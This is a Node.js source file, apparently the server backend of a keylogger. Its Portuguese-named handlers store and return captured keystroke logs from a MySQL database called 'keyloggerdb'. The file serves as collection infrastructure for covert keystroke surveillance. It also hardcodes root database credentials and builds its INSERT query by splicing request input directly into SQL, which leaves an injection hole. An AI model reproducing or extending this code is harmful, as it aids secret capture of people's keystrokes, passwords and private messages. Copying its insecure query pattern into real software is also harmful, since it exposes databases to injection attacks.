import mysql from 'mysql';

export function carregarTodos(req,res){

    var con = mysql.createConnection({
        host: "localhost",
        user: "root",
        password: "sa",
        database: "keyloggerdb"
      });
      
      con.connect(function(err) {
        if (err) 
            throw err;

        var sql = 'select * from keylogs';

        console.log("Conectado no mysql");
        con.query(sql, function (err, result) {
          if (err) 
            throw err;

          //var resultado = result.filter(i => i.Id == 35);
          //console.log("Result: " + resultado[0].Id);
          //res.send(resultado);
          res.send(result);

        });
      });
}

export function carregarKeylog(req,res){

    var con = mysql.createConnection({
        host: "localhost",
        user: "root",
        password: "sa",
        database: "keyloggerdb"
      });
      
      con.connect(function(err) {
        if (err) 
            throw err;

        var sql = 'select * from keylogs';

        console.log("Conectado no mysql");
        con.query(sql, function (err, result) {
          if (err) 
            throw err;

          console.log(req.params.Id);  

          var resultado = result.filter(i => i.Id == req.params.Id);
          console.log("Result: " + resultado[0]);
          res.send(resultado);          

        });
      });
}


export function inserirKeyLogs(req,res){

    var con = mysql.createConnection({
        host: "localhost",
        user: "root",
        password: "sa",
        database: "keyloggerdb"
      });


      con.connect(function(err) {
        if (err) 
            throw err;
            
        console.log("body: " + req.body);
            
        var sql = `INSERT INTO KeyLogs(json) values ('${ req.body.json }')`;
        
        console.log("Conectado no mysql");
        con.query(sql, function (err, result) {
            if (err) 
                throw err;
            if(result.affectedRows >= 1)
                res.send('Incluído');
        });
      });

}
